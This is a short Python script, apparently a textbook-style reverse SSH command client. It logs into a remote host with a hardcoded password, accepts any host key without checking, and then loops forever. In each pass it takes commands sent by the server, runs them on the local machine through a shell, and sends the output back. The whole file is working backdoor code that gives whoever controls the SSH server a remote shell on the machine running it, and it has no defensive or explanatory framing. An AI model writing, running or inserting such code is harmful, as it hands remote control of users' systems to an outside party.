import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, cmd):
    client = paramiko.SSHClient()
    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    client.connect(
        ip, 
        username=user, 
        password=passwd, 
        look_for_keys=False,
        allow_agent=False
        )
    
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.exec_command(cmd)
        print(ssh_session.recv(1024).decode())
        while True:
            # Getting the command from the SSH server
            cmd = ssh_session.recv(1024).decode()
            try:
                cmd_op = subprocess.check_output(cmd, shell=True)
                ssh_session.send(cmd_op)
            except Exception as e:
                ssh_session.send(str(e))
    
    client.close()
    return

ssh_command('test.rebex.net', 'demo', 'password', 'ClientConnected')